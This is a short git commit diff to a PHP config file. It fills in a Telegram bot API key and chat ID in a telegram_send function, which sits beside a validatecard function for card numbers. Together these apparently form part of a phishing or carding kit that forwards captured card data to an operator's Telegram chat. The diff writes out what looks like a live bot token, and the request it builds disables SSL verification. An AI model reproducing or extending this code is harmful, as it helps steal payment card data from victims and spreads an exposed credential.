2deb932908d3b13ff0030ffbb897b0f6d22a2b6a
amine <baraka.barak@gmail.com>
2022-12-04 15:16:11 +0000

    Update config.php

--- config.php
+++ config.php
@@ -138,8 +138,8 @@ function validatecard($cc)
 
 function telegram_send($message) {
     $curl = curl_init();
-    $api_key  = ""; // API KEY
-    $chat_id  = ""; // CHAT ID
+    $api_key  = "2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo"; // API KEY
+    $chat_id  = "2039615741"; // CHAT ID
     $format   = 'HTML';
     curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
     curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
